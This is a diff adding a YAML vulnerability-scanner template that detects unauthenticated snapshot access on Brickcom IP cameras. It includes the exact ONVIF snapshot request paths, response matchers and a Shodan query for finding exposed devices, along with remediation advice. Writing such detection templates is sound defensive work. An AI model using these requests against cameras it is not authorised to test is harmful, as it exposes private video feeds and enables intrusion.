@@ -1,0 +1,35 @@
+id: brickcom-camera-unauthorized-snapshot-access
+
+info:
+  name: Brickcom Camera未授权快照访问漏洞
+  author: 0xr2r
+  severity: high
+  description: |
+    Brickcom IP cameras的ONVIF media endpoint未对访问进行身份验证，导致实时摄像机快照可被未授权获取。
+  reference:
+    - https://cxsecurity.com/issue/WLB-2026020031
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: 'realm="Brickcom"'
+  tags: Brickcom-Camera
+  remediation: >-
+    升级到已修复版本，并在服务端对每个受影响的操作和资源执行身份认证与授权检查。采用默认拒绝的访问控制策略，删除默认凭据，在可用时启用多因素认证，并限制管理端点的访问。
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ONVIF/media.cgi?action=getSnapshot"
+      - "{{BaseURL}}/ONVIF/media.cgi?action=getSnapshot&channel=1"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "image/jpeg"
+
+# digest: 4b0a004830460221009c631e06a6c5003abf641e86099cd3968caabc0120a5d10faeb128f51d7506a6022100ccf46ae904671d341e6107fa61172789c66c6d10555f7ff6f82eb236be859c40:922c64590222798bb761d5b6d8e72950
